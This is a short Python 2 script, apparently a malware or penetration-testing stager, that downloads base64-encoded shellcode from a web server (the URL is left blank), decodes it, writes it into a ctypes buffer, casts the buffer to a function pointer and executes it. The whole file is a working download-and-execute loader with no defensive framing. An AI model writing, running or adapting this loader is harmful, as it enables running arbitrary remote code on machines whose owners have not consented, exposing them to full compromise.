import urllib2
import ctypes
import base64

# retrieve the shellcode from web server
url = ""
response = urllib2.urlopen(url)

#decode the shellcode from base64
shellcode = base64.b64decode(response.read())

#create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode,len(shellcode))

#create a function pointer to shell code
shellcode_func = ctypes.cast(shellcode_buffer,ctypes.CFUNCTYPE(ctypes.c_void_p))

#call shellcode
shellcode_func()